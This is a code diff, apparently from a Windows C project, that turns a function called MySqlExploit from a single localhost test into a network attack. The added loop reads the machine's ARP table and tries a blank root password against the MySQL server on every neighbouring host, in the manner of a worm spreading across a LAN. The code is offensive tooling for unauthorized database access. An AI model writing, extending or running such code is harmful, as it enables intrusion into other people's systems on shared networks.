@@ -90,9 +90,9 @@ void MySqlExploit(char *host,char *root,char *pwd)
 		unsigned long version;
 
 		if (!mysql_real_connect(&mysql,
-								"127.0.0.1",		// host
-								"root",				// user
-								"cc",				// password
+								host,		// host
+								root,				// user
+								pwd,				// password
 								NULL,				// db name, NULL = default
 								0,					// port, 0 = default
 								NULL,				// unix_socket, use socket or pipe if not NULL
@@ -225,49 +225,20 @@ PMIB_IPNETTABLE GetArpTable(BOOL bOrder)
 		pIpNetTable = (PMIB_IPNETTABLE)GlobalAlloc(GPTR,dwActualSize);
 		if (GetIpNetTable(pIpNetTable,&dwActualSize,bOrder) == NO_ERROR)
 			return pIpNetTable;
+		else
+			printf("%d",GetLastError());
 		GlobalFree(pIpNetTable);
 	}
 	return NULL;
-}
-
-PMIB_IPADDRTABLE GetIpTable(BOOL bOrder)
-{
-	PMIB_IPADDRTABLE pIpAddrTable = NULL;
-	DWORD dwActualSize = 0;
-	if (GetIpAddrTable(pIpAddrTable,&dwActualSize,bOrder) == ERROR_INSUFFICIENT_BUFFER)
-	{
-		pIpAddrTable = (PMIB_IPADDRTABLE)GlobalAlloc(GPTR,dwActualSize);
-		if (GetIpAddrTable(pIpAddrTable,&dwActualSize,bOrder) == NO_ERROR)
-			return pIpAddrTable;
-		GlobalFree(pIpAddrTable);
-	}
-	return NULL;
-}
-
-BOOL InterfaceIdxToInterfaceIp(PMIB_IPADDRTABLE pIpAddrTable,DWORD dwIndex,DWORD *dwIpAddr)
-{
-	DWORD dwIdx;
-	for (dwIdx = 0; dwIdx < pIpAddrTable->dwNumEntries; dwIdx++)
-	{
-		if (dwIndex == pIpAddrTable->table[dwIndex].dwIndex)
-		{
-			*dwIpAddr = pIpAddrTable->table[dwIndex].dwAddr;
-			if (dwIpAddr != 0)
-				return TRUE;
-			else
-				return FALSE;
-		}
-	}
-	return FALSE;
 }
 
 int _tmain(int argc, _TCHAR* argv[])
 {	
 	HANDLE hMutex;
 	char szHostName[128] = {0};
+	char targetIP[16] = {0};
 
 	PMIB_IPNETTABLE pIpNetTable = NULL;
-	PMIB_IPADDRTABLE pIpAddrTable = NULL;
 	DWORD dwActualSize = 0,dwIpAddr = 0;
 	unsigned int i;
 
@@ -286,18 +257,6 @@ int _tmain(int argc, _TCHAR* argv[])
 	pIpNetTable = GetArpTable(TRUE);
 	if (pIpNetTable == NULL)
 		return -1;
-	pIpAddrTable = GetIpTable(TRUE);
-	for (i = 0; i < pIpNetTable->dwNumEntries; ++i)
-	{
-		dwIpAddr = 0;
-		if (InterfaceIdxToInterfaceIp(pIpAddrTable,pIpNetTable->table[i].dwIndex,&dwIpAddr))
-			printf("[%d]:%s\n",i,inet_ntoa(*(struct in_addr *)&dwIpAddr));
-		else
-			printf("[%d]:Could not convert IP address.\n",i);
-	}
-
-	wait();
-	return 0;
 
 	InitSocket();
 
@@ -306,16 +265,19 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	mysql_init(&mysql);
 
-	do 
+	for (i = 0; i < pIpNetTable->dwNumEntries; ++i)
 	{
-		MySqlExploit("127.0.0.1","root","cc");
-		break;
-	} while (TRUE);
+		ZeroMemory(targetIP,16);
+		sprintf_s(targetIP,16,"%s",inet_ntoa(*(struct in_addr *)&pIpNetTable->table[i].dwAddr));
+		printf("[%d]:%s\n",i,targetIP);
+		MySqlExploit(targetIP,"root","");
+	}
 
 	mysql_close(&mysql);
 	mysql_library_end();
+	if (pIpNetTable)
+		GlobalFree(pIpNetTable);
 	
-	wait();
 	CloseHandle(hMutex);
 	return 0;
 }
